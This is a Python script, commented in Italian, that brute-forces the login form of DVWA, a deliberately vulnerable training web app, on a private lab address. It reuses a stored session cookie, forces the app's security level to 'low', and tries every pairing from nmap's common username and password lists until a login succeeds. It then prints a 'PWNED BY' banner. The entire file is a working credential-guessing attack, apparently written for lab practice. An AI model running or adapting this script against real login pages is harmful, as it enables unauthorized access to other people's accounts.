import requests
import sys

#si aprono i file esterni contenenti usernames e passwords più usati. viene messo cosi e non con tutto il path perchè si trovano nella stessa cartella di questo script
user_file = open('/usr/share/nmap/nselib/data/usernames.lst')
pass_file = open('/usr/share/nmap/nselib/data/passwords.lst')  

#apre il file cookie.txt, precedentemente creato dal bruteforce_dvwa, per avere il phpsessid e poter accedere con gli stessi cookie
sessid_file = open('phpsessid.txt')

#legge il file aperto precedentemente
sessid=sessid_file.readline().rstrip()
#se in questo modo si imposta nel cookie sia il phpsessid che il security level, anche se sul sito è impostato il livello di sicurezza su alto, questo lo abbassa a low
Cookie = {
        "PHPSESSID": sessid,
        "security": 'low'
}
#legge i file usernames e passwords
user_list = user_file.readlines()
pass_list = pass_file.readlines()

#si crea un ciclo con questa variabile, dove in caso di bruteforce avvenuto, viene interrotto
found = 0

#per ogni utente presente nel precedente file, viene provata una password dell'altro file, fino a che non abbiamo il match
for user in user_list:
    user = user.rstrip()
    #se ci sono commenti nel file che iniziano per '#', li ignora e non li usa per il match. Questo vale sia per il file usernames che sotto per il file passwords
    if(not user.startswith('#')):
        for pwd in pass_list:
            pwd = pwd.rstrip()
            if(not pwd.startswith('#')):
            #escamotage grafico per cancellare la riga precedente, che non ha match positivo, che viene sovrascritta dalla successiva.
                sys.stdout.write("\033[A")
                sys.stdout.write("\033[K")
                #stampa user e pwd sulla stessa riga, separati dal "-"
                print (user, "-", pwd)  
                
                #check degli headers contenenti nella richiesta di login                                
                headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
                
                #parametri da inserire per provare il bruteforce
                post_par ={'username': user, 'password': pwd, 'Login':'Login'}
                
                #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
                risp = requests.get('http://192.168.50.101/dvwa/vulnerabilities/brute/', post_par, cookies=Cookie, allow_redirects=False)
                
                #se il server non dà risposta, non abbiamo il phpsessid, e restituisce in output questo, chiudendo successivamente il ciclo col found a 1    
                if(risp.text==""):
                    print(f"Session id errato")
                    found=1
                    break
                #altrimenti, se nella risposta del server troviamo la scritta "Welcome to the...", il bruteforce è riuscito alla perfezione, dando in output il log in con le credenziali valide, restituisce 1 alla variabile found e chiude il ciclo       
                elif(risp.text.find("Welcome to the") != -1):
                    print(f"\nLog in!\nuser: {user}\npassword: {pwd}\n\n\n") 
                    found=1
                    break
                    
    if(found==1): 
        break
        
#si chiudono i file aperti inizialmente
user_file.close()
pass_file.close()
sessid_file.close()

print("PWNED BY")
print("\n /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$")
print("| $$$ | $$| $$_____/|__  $$__/| $$__  $$ /$$__  $$|_  $$_/| $$__  $$| $$_____/| $$__  $$ /$$__  $$")
print("| $$$$| $$| $$         | $$   | $$  \ $$| $$  \ $$  | $$  | $$  \ $$| $$      | $$  \ $$| $$  \__/")
print("| $$ $$ $$| $$$$$      | $$   | $$$$$$$/| $$$$$$$$  | $$  | $$  | $$| $$$$$   | $$$$$$$/|  $$$$$$ ")
print("| $$  $$$$| $$__/      | $$   | $$__  $$| $$__  $$  | $$  | $$  | $$| $$__/   | $$__  $$ \____  $$")
print("| $$\  $$$| $$         | $$   | $$  \ $$| $$  | $$  | $$  | $$  | $$| $$      | $$  \ $$ /$$  \ $$")
print("| $$ \  $$| $$$$$$$$   | $$   | $$  | $$| $$  | $$ /$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/")
print("|__/  \__/|________/   |__/   |__/  |__/|__/  |__/|______/|_______/ |________/|__/  |__/ \______/ ")
